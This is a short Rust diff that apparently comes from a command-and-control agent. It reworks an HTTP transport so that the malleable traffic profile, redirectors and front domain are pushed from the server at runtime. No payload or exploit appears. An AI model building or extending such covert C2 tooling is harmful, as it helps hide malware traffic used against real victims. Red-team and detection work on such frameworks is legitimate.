@@ -296,7 +296,14 @@ pub async fn build_outbound_transport(
                     info!("http-transport: cdn_relay=true; switching to HttpTransport");
                     let session = CryptoSession::from_shared_secret(secret.as_bytes());
                     return Ok(Box::new(
-                        crate::c2_http::HttpTransport::new(&cfg.malleable_profile, session, agent_id.to_string(), cfg.server_cert_fingerprint.clone())
+                        crate::c2_http::HttpTransport::new(
+                            None,     // agent malleable profile — loaded from server at runtime
+                            session,
+                            agent_id.to_string(),
+                            Some(&cfg.malleable_profile),
+                            vec![],   // redirectors — populated via server push at runtime
+                            None,     // front_domain — populated via server push at runtime
+                        )
                             .await
                             .map_err(|e| anyhow!("HttpTransport init failed: {e}"))?,
                     ));
